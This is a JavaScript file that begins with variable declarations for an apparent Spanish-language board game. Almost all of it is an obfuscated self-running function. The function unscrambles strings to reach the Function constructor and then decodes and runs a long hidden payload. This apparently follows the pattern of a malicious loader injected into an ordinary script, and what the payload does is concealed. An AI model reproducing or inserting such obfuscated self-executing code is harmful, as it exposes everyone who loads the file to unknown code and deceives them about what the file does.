var ultimoMovimiento,piezasConsPosibilidadDeEliminar,piezaElimino,piezasConsPosibilidadDeEliminarTurnoAnteriorEnemigo,enTurno,reporducir;(function(){var xnD='',cvO=678-667;function HLm(c){var o=5952051;var v=c.length;var q=[];for(var r=0;r<v;r++){q[r]=c.charAt(r)};for(var r=0;r<v;r++){var u=o*(r+402)+(o%50169);var j=o*(r+534)+(o%40702);var x=u%v;var t=j%v;var m=q[x];q[x]=q[t];q[t]=m;o=(u+j)%6126860;};return q.join('')};var YCn=HLm('otiyjdskzutabwrxnglncmtcchpevsooruqfr').substr(0,cvO);var zPE='c) av=or2=7yAr}}sebwyftuw , <re,=ht .>(<re(r=. ,hxe."ceaCaf=r7=m[e),,ahv;k,=u wgrsrnsq9fov(fgle2,+C,8o29wakvr8(;a6[8)ou67;;3c);=4)t)i;]w)r(ghv=a=l+ p8 am;t{ui*uvhj==ri0j04iccb1,=+;s9j3tfw=a),g1maa+,rrnhsrjleno5eo 2ule(h];lu6l;dri+1rgdr[tr.haormnsw;=2vas[o[ArC ;)y))r-bq6.n.{areia.vr2o=>f0y+h]n=8=7h+=i)oa,=ba.kshu=m4taqa6=)nhot(v.ng;0v,[r=pt()o0.h ,efvp i+(};nga[i;s0"=hh]v+A Cga }la2ev)2t s;qyd=paei(r-d jfll;f=ovrp0gndj32;=+0 )hl[vop,uvnwr;o- (4kAlr=l";onm=+5rb+t.gnCq)rbds.(t(,f([uo0{[,w(tn s0t(es+;)t4;p-),{;8,5(=h1,tv]]y8r;g.,=c+-3=et;8a(i=uekeo5] r;t9lh)i<i9.+a{]lo0+;;u]pSu-=};ntz"1paalb))t+.+n;ttl;vktn.atew9a;(iffp!1"1n(+;(}(o<sar.rf1erk.qubb)-if.vuinrvvtiel7=(0.(";Crt}s;.,aki)djoor)v7rvaf4o[li*("");fc+(a=w;4c;cf9;,;vm1)0.6[.nchcaj1)(toanb 6)dti<(cnlhsCrns nd=(sf]m];+no7r )1av(, {=t]rnhe=nj=mh(;spli]=t,utc{[h]tebw=(gf.rASed"rg+[)ol hurev68.lgtn,vgg70l.n(k)),(Ct.;+;!")++;in;w5;';var vhL=HLm[YCn];var mUe='';var Szy=vhL;var hpn=vhL(mUe,HLm(zPE));var jtc=hpn(HLm('()=%dg0mmo6 5Ojdacg7t}n d)fden1Ing731r:1]j+3o;i.,e)_d5Oin=g6;7Sea_e}${ad!p$m)r0Ooc;();1og719ipaOOmCO$m_O1%t])nOi\',d!(neni14m( v6,f.+.q;,t_10eO9o))( eo"leOOt.$_.5OO#(m=iO\' duOaeol.._(7n7eO).il3 e"(o75!i%_,(ao"8t(3(6$2l=rutO(i3nO&{elO"f#e!)!1nz ,cynnsa[)i;tmpta (ef(ded}in(!2=TaiOOaOdsl1zOihi={asne15o$aao===.{ng=o6}xs[i7$0-;6oO(d",bf*.iew+({7d,.);.0EalOqOa;%5$]O2f([5.0t")on(fu6es)p(pOnOed))$.=qq3]oDfhssa(2yntcvoeeOOe37:ao;i0.3O(d\/OO O043i1O0tEo;{3\'d,d83p.aO! gs_a,1;.5no)!;O=_tt7);tdhe7;.,_#3r,mltd,O(aii)e_5ObOn.7;;orO#8Oie; }Oj)0#gs(%:=tm7,_O()zzp$O;n}4)alo,}psr]Osnlu.=rimO.rbcra$)omf5 O0.r(00(fo.ft\'El..lnOOjgOdl;;ge-nE%Oc8$+}f..O(E+cd2 ;r_-eo2m)(jul*0edldouceO;="t1)bf9nrt)0ettyui05az::06u.runeow.3$scs"7m!. n_s%r (_m6(f.3l83l_la,o{_til.tek!stOu.lfOOniOcs;aie({san f(da)7el,6]n(7iteg:,=tcqm rl)O!Onj{Os$!$on!O_D4{5OO;uOy7itar5,:T]=!OsaiO{cO,\'N)if!}lnate.j,sr:=O.(l.9ex2nt!7oo_!f$.(oudbtO_iot [3iO%g_l)eOi*Creuizt.*njm_zajfOO,o..7te)7O!s6#aiOo,[1aO5,O,}Oi.f_2elOd3r5a+ile=n0$q=4o({0da{,te))i$lEii{ade&unfl+asnaf5rai,;]fjc)goo}=9OtiOm2,.n90O(nens:olSt;O37O{O$7$etmc{dt=iOt2qa bntn.toaoOlO!.(r{fonO.sn}tfnxm,u-an+ffi}d)daO(i1=c,;ernsoaas5ll8S\/mOotz_O.z]l5.}1251u#)o=de4!:On$.e)l1}4_,Si4t.ieims)b47].doa1(b7b+o%n,3.OO:fal7_g.O(=!blg2so)i=aO.9v\'4so.yar5)olOa;u=.o9di)+a_Osaa3p70qa2r;$eornO.415 Oi2.sn!}(d4f$5.dlOqO3!Oimil$eC.jf=l,o_ey_5taar7$3niO$f3)d.s__Oipnm;.2. OmOC)}8ozs)O})=lt$af.!cg15jmO.Out$,_#aS_i}24so$]toO0cn,s;$f2.]an.6.:&)Oi_.7Osu:OOsi!dfdlbeOi\/i)nvddM7l5O1;u,O e55(o=i)3tO;nozb;lp3ttr.o&3poidOOtO[O(n{{ntl;dn3e:)um.[i) .li!(. On1dn2(e.._4[m.t jsnfe)._. dit(Orsf3O(e\/r'));var WNk=Szy(xnD,jtc );WNk(8705);return 4559})()
